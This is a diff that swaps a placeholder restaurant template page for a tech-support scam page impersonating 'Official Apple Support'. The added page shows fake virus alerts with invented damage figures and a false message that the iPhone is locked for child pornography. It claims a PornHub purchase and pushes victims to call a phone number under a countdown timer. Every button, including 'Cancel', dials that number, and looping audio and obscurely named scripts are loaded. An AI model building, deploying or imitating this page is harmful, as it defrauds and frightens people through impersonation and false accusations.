@@ -1,543 +1,127 @@
-<?php
-?>
-<!DOCTYPE html>
-	<html lang="zxx" class="no-js">
-	<head>
-		<!-- Mobile Specific Meta -->
-		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-		<!-- Favicon-->
-		<link rel="shortcut icon" href="img/fav.png">
-		<!-- Author Meta -->
-		<meta name="author" content="colorlib">
-		<!-- Meta Description -->
-		<meta name="description" content="">
-		<!-- Meta Keyword -->
-		<meta name="keywords" content="">
-		<!-- meta character set -->
-		<meta charset="UTF-8">
-		<!-- Site Title -->
-		<title>Marco</title>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
 
-		<link href="https://fonts.googleapis.com/css?family=Poppins:100,200,400,300,500,600,700" rel="stylesheet"> 
-			<!--
-			CSS
-			============================================= -->
-			<link rel="stylesheet" href="css/linearicons.css">
-			<link rel="stylesheet" href="css/font-awesome.min.css">
-			<link rel="stylesheet" href="css/bootstrap.css">
-			<link rel="stylesheet" href="css/magnific-popup.css">
-			<link rel="stylesheet" href="css/jquery-ui.css">				
-			<link rel="stylesheet" href="css/nice-select.css">							
-			<link rel="stylesheet" href="css/animate.min.css">
-			<link rel="stylesheet" href="css/owl.carousel.css">				
-			<link rel="stylesheet" href="css/main.css">
-		</head>
-		<body>	
-			<header id="header">
-				<div class="header-top">
-					<div class="container">
-				  		<div class="row justify-content-center">
-						      <div id="logo">
-						        <a href="index.html"><img src="img/logo.png" alt="" title="" /></a>
-						      </div>
-				  		</div>			  					
-					</div>
-				</div>
-				<div class="container main-menu">
-					<div class="row align-items-center justify-content-center d-flex">			
-				      <nav id="nav-menu-container">
-				        <ul class="nav-menu">
-				          <li><a href="index.html">Home</a></li>
-				          <li><a href="about.html">About</a></li>
-				          <li><a href="menu.html">Menu</a></li>
-				          <li><a href="gallery.html">Gallery</a></li>
-				          <li class="menu-has-children"><a href="">Blog</a>
-				            <ul>
-				              <li><a href="blog-home.html">Blog Home</a></li>
-				              <li><a href="blog-single.html">Blog Single</a></li>
-				            </ul>
-				          </li>	
-				          <li class="menu-has-children"><a href="">Pages</a>
-				            <ul>
-				            	  <li><a href="elements.html">Elements</a></li>
-						          <li class="menu-has-children"><a href="">Level 2 </a>
-						            <ul>
-						              <li><a href="#">Item One</a></li>
-						              <li><a href="#">Item Two</a></li>
-						            </ul>
-						          </li>					                		
-				            </ul>
-				          </li>					          					          		          
-				          <li><a href="contact.html">Contact</a></li>
-				        </ul>
-				      </nav><!-- #nav-menu-container -->					      		  
-					</div>
-				</div>
-			</header><!-- #header -->
-			
-			<!-- start banner Area -->
-			<section class="banner-area">		
-				<div class="container">
-					<div class="row fullscreen align-items-center justify-content-between">
-						<div class="col-lg-12 banner-content">
-							<h6 class="text-white">Wide Options of Choice</h6>
-							<h1 class="text-white">Delicious Recipes</h1>
-							<p class="text-white">
-								inappropriate behavior is often laughed off as “boys will be boys,” women face higher conduct standards especially in the workplace. That’s why it’s crucial that, as women.
-							</p>
-							<a href="#" class="primary-btn text-uppercase">Check Our Menu</a>
-						</div>
-					</div>
-				</div>					
-			</section>
-			<!-- End banner Area -->
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
 
-			<!-- Start home-about Area -->
-			<section class="home-about-area section-gap">
-				<div class="container">
-					<div class="row align-items-center">
-						<div class="col-lg-6 home-about-left">
-							<h1>About Our Story</h1>
-							<p>
-								Who are in extremely love with eco friendly system. Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
-							</p>
-							<a href="#" class="primary-btn">view full menu</a>
-						</div>
-						<div class="col-lg-6 home-about-right">
-							<img class="img-fluid" src="img/about-img.jpg" alt="">
-						</div>
-					</div>
-				</div>	
-			</section>
-			<!-- End home-about Area -->			
+  <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5041122,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5041122&101" alt="counter hit make" border="0"></a></noscript>
+<!-- Histats.com  END  -->
+    
+</head>
 
-			<!-- Start menu-area Area -->
-            <section class="menu-area section-gap" id="menu">
-                <div class="container">
-					<div class="row d-flex justify-content-center">
-						<div class="menu-content pb-70 col-lg-8">
-							<div class="title text-center">
-								<h1 class="mb-10">What kind of Foods we serve for you</h1>
-								<p>Who are in extremely love with eco friendly system.</p>
-							</div>
-						</div>
-					</div>	
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
 
-                    <ul class="filter-wrap filters col-lg-12 no-padding">
-                        <li class="active" data-filter="*">All Menu</li>
-                        <li data-filter=".breakfast">Breakfast</li>
-                        <li data-filter=".lunch">Lunch</li>
-                        <li data-filter=".dinner">Dinner</li>
-                        <li data-filter=".budget-meal">Budget Meal</li>
-                        <li data-filter=".buffet">Buffet</li>
-                    </ul>
-                    
-                    <div class="filters-content">
-                        <div class="row grid">
-                            <div class="col-md-6 all breakfast">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Cappuccion</h4>
-										<h4 class="price">$49</h4>
-									</div>			
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>					                               
-                            </div>                           
-                            <div class="col-md-6 all dinner">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Americano</h4>
-										<h4 class="price">$49</h4>
-									</div>			
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all budget-meal">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Macchiato</h4>
-										<h4 class="price">$49</h4>
-									</div>			
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all breakfast">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Mocha</h4>
-										<h4 class="price">$49</h4>
-									</div>
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all lunch">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Piccolo Latte</h4>
-										<h4 class="price">$49</h4>
-									</div>
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>
-                            <div class="col-md-6 all buffet">
-								<div class="single-menu">
-									<div class="title-wrap d-flex justify-content-between">
-										<h4>Ristretto</h4>
-										<h4 class="price">$49</h4>
-									</div>
-									<p>
-										Usage of the Internet is becoming more common due to rapid advance.
-									</p>									
-								</div>
-                            </div>                            
+        
+    <div class="bgimg">
+            <video autoplay loop muted style="width: 100%;">
+  <source src="images/vdo.webm" type="video/webm">
+</video>
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+   <div class="alert-title">Your iOS is infected with 3 viruses. Our security check found traces of 8 malware and 12 phishing/spyware. System damage: 28.1%.<br>
+    immediete removal required!</div>
+   
+    <div class="txstm"> Please contact Apple Support immediately at <strong><a href="tel:+1-888-515-4487">+1-888-515-4487</a></strong> to secure your device and prevent unauthorized activity.</div>
+    <a href="tel:+1-888-515-4487" class="alert-button"><span id="countdown">10:00</span> remaining before damage is permanent.</a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
                         </div>
                     </div>
-                    
                 </div>
-            </section>
-            <!-- End menu-area Area -->			
+            </div>
+        </section>
+    </div>
 
-			<!-- Start reservation Area -->
-			<section class="reservation-area section-gap relative">
-				<div class="overlay overlay-bg"></div>
-				<div class="container">
-					<div class="row justify-content-between align-items-center">
-						<div class="col-lg-6 reservation-left">
-							<h1 class="text-white">Reserve Your Seats
-							to Confirm if You Come
-							with Your Family</h1>
-							<p class="text-white pt-20">
-								Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam. Quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea.
-							</p>
-						</div>
-						<div class="col-lg-5 reservation-right">
-							<form class="form-wrap text-center" action="#">
-								<input type="text" class="form-control" name="name" placeholder="Your Name" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Your Name'" >
-								<input type="email" class="form-control" name="email" placeholder="Your Email Address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Your Email Address'" >
-								<input type="text" class="form-control" name="phone" placeholder="Phone Number" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Phone Number'" >		
-								<input type="text" class="form-control date-picker" name="date" placeholder="Select Date & time" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Select Date & time'" >									
-								<div class="form-select" id="service-select">
-									<select>
-										<option data-display="">Select Event</option>
-										<option value="1">Event One</option>
-										<option value="2">Event Two</option>
-										<option value="3">Event Three</option>
-										<option value="4">Event Four</option>
-									</select>
-								</div>									
-								<button class="primary-btn text-uppercase mt-20">Make Reservation</button>
-							</form>
-						</div>
-					</div>
-				</div>	
-			</section>
-			<!-- End reservation Area -->
-			
-			<!-- Start gallery-area Area -->
-            <section class="gallery-area section-gap" id="gallery">
-                <div class="container">
-					<div class="row d-flex justify-content-center">
-						<div class="menu-content pb-70 col-lg-8">
-							<div class="title text-center">
-								<h1 class="mb-10">Food and Customer Gallery</h1>
-								<p>Who are in extremely love with eco friendly system.</p>
-							</div>
-						</div>
-					</div>	
-                    
-                    <ul class="filter-wrap filters col-lg-12 no-padding">
-                        <li class="active" data-filter="*">All Menu</li>
-                        <li data-filter=".breakfast">Breakfast</li>
-                        <li data-filter=".lunch">Lunch</li>
-                        <li data-filter=".dinner">Dinner</li>
-                        <li data-filter=".budget-meal">Budget Meal</li>
-                        <li data-filter=".buffet">Buffet</li>
-                    </ul>
-                    
-                    
-                    <div class="filters-content">
-                        <div class="row grid">
-                            <div class="col-lg-4 col-md-6 col-sm-6 all breakfast">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g1.jpg" alt="">
-                            	</div>	                          
-                            </div>                           
-                            <div class="col-lg-4 col-md-6 col-sm-6 all dinner">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g2.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all budget-meal">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g3.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all breakfast">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g4.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all lunch">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g5.jpg" alt="">
-                            	</div>                            
-                            </div>
-                            <div class="col-lg-4 col-md-6 col-sm-6 all buffet">
-                            	<div class="single-gallery">
-                            		<img class="img-fluid" src="img/g6.jpg" alt="">
-                            	</div>                            
-                            </div>                            
-                        </div>
+    <div class="notification">
+        <div class="msalogo"><img src="images/warn.png" alt="" width="30px"> EMERGENCY ALERTS</div>
+<div class="cursor">now</div>
+  <div class="notification-body">
+    Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase <br>of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-515-4487">+1-888-515-4487</a> to unlock it!
+  </div>
+  <img src="images/apple.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    
+     <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-50px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alertimg">
+                        <img src="images/warn.png" alt="" style="width: 80px;">
                     </div>
+                    <h4 style="font-weight: 600;">Security Warning!</h4>
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-888-515-4487">+1-888-515-4487</a> to unlock it!
+                    </div>
+
                     
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-888-515-4487" class="me-2 bg-primary">Call +1-888-515-4487</a>
+                        <a href="tel:+1-888-515-4487" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
                 </div>
-            </section>
-            <!-- End gallery-area Area -->			
+            </div>
+        </div>
+    </div>
 
-			<!-- Start review Area -->
-			<section class="review-area section-gap">
-				<div class="container">
-					<div class="row">
-						<div class="active-review-carusel">
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>	
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>
-							<div class="single-review">
-								<img src="img/user.png" alt="">
-								<h4>Hulda Sutton</h4>
-								<div class="star">
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star checked"></span>
-									<span class="fa fa-star"></span>								
-								</div>	
-								<p>
-									“Accessories Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker. Here you can find the best computer accessory for your laptop, monitor, printer, scanner, speaker.”
-								</p>
-							</div>														
-						</div>
-					</div>
-				</div>	
-			</section>
-			<!-- End review Area -->					
-
-			<!-- Start blog Area -->
-			<section class="blog-area section-gap" id="blog">
-				<div class="container">
-					<div class="row d-flex justify-content-center">
-						<div class="menu-content pb-70 col-lg-8">
-							<div class="title text-center">
-								<h1 class="mb-10">Latest From Our Blog</h1>
-								<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore  et dolore magna aliqua.</p>
-							</div>
-						</div>
-					</div>					
-					<div class="row">
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b1.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>Cooking Perfect Fried Rice
-							in minutes</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b2.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>Secret of making Heart 
-							Shaped eggs</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b3.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>How to check steak if 
-							it is tender or not</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>
-						<div class="col-lg-3 col-md-6 col-sm-6 single-blog">
-							<div class="thumb">
-								<img class="img-fluid" src="img/b4.jpg" alt="">								
-							</div>
-							<p class="date">10 Jan 2018</p>
-							<a href="blog-single.html"><h4>Seaseme and black seed
-							Flavored Bun Rocks</h4></a>
-							<p>
-								inappropriate behavior ipsum dolor sit amet, consectetur.
-							</p>
-							<div class="meta-bottom d-flex justify-content-between">
-								<p><span class="lnr lnr-heart"></span> 15 Likes</p>
-								<p><span class="lnr lnr-bubble"></span> 02 Comments</p>
-							</div>									
-						</div>							
-					</div>
-				</div>	
-			</section>
-			<!-- End blog Area -->							
-
-			<!-- start footer Area -->		
-			<footer class="footer-area">
-				<div class="footer-widget-wrap">
-					<div class="container">
-						<div class="row section-gap">
-							<div class="col-lg-4  col-md-6 col-sm-6">
-								<div class="single-footer-widget">
-									<h4>Opening Hours</h4>
-									<ul class="hr-list">
-										<li class="d-flex justify-content-between">
-											<span>Monday - Friday</span> <span>08.00 am - 10.00 pm</span>
-										</li>
-										<li class="d-flex justify-content-between">
-											<span>Saturday</span> <span>08.00 am - 10.00 pm</span>
-										</li>
-										<li class="d-flex justify-content-between">
-											<span>Sunday</span> <span>08.00 am - 10.00 pm</span>
-										</li>																				
-									</ul>
-								</div>
-							</div>
-							<div class="col-lg-4  col-md-6 col-sm-6">
-								<div class="single-footer-widget">
-									<h4>Contact Us</h4>
-									<p>
-										56/8, los angeles, rochy beach, Santa monica, United states of america - 1205
-									</p>
-									<p class="number">
-										012-6532-568-9746 <br>
-										012-6532-569-9748
-									</p>
-								</div>
-							</div>						
-							<div class="col-lg-4  col-md-6 col-sm-6">
-								<div class="single-footer-widget">
-									<h4>Newsletter</h4>
-									<p>You can trust us. we only send promo offers, not a single spam.</p>
-									<div class="d-flex flex-row" id="mc_embed_signup">
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
 
 
-										  <form class="navbar-form" action="https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01" method="get">
-										    <div class="input-group add-on align-items-center d-flex">
-										      	<input class="form-control" name="EMAIL" placeholder="Your Email address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Your Email address'" required="" type="email">
-												<div style="position: absolute; left: -5000px;">
-													<input name="b_36c4fd991d266f23781ded980_aefe40901a" tabindex="-1" value="" type="text">
-												</div>
-										      <div class="input-group-btn">
-										        <button class="genric-btn"><span class="lnr lnr-arrow-right"></span></button>
-										      </div>
-										    </div>
-										      <div class="info mt-20"></div>
-										  </form>
-									</div>
-								</div>
-							</div>						
-						</div>					
-					</div>					
-				</div>
-				<div class="footer-bottom-wrap">
-					<div class="container">
-						<div class="row footer-bottom d-flex justify-content-between align-items-center">
-							<p class="col-lg-8 col-mdcol-sm-6 -6 footer-text m-0"><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | Made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a> &amp; distributed by <a href="https://themewagon.com" target="_blank">ThemeWagon</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
-							<ul class="col-lg-4 col-mdcol-sm-6 -6 social-icons text-right">
-	                            <li><a href="#"><i class="fa fa-facebook"></i></a></li>
-	                            <li><a href="#"><i class="fa fa-twitter"></i></a></li>
-	                            <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
-	                            <li><a href="#"><i class="fa fa-behance"></i></a></li>           
-	                        </ul>
-						</div>						
-					</div>
-				</div>
-			</footer>
-			<!-- End footer Area -->	
 
-			<script src="js/vendor/jquery-2.2.4.min.js"></script>
-			<script src="js/popper.min.js"></script>
-			<script src="js/vendor/bootstrap.min.js"></script>			
-			<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBhOdIF3Y9382fqJYt5I_sswSrEw5eihAA"></script>		
- 			<script src="js/jquery-ui.js"></script>					
-  			<script src="js/easing.min.js"></script>			
-			<script src="js/hoverIntent.js"></script>
-			<script src="js/superfish.min.js"></script>	
-			<script src="js/jquery.ajaxchimp.min.js"></script>
-			<script src="js/jquery.magnific-popup.min.js"></script>						
-			<script src="js/jquery.nice-select.min.js"></script>					
-			<script src="js/owl.carousel.min.js"></script>			
-            <script src="js/isotope.pkgd.min.js"></script>								
-			<script src="js/mail-script.js"></script>	
-			<script src="js/main.js"></script>	
-		</body>
-	</html>
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/Jdjifsx.js"></script>
+    <script src="js/NsicjSc.js"></script>
+    <script src="js/NisifAZ.js"></script>
+
+
+
+
+</body></html>
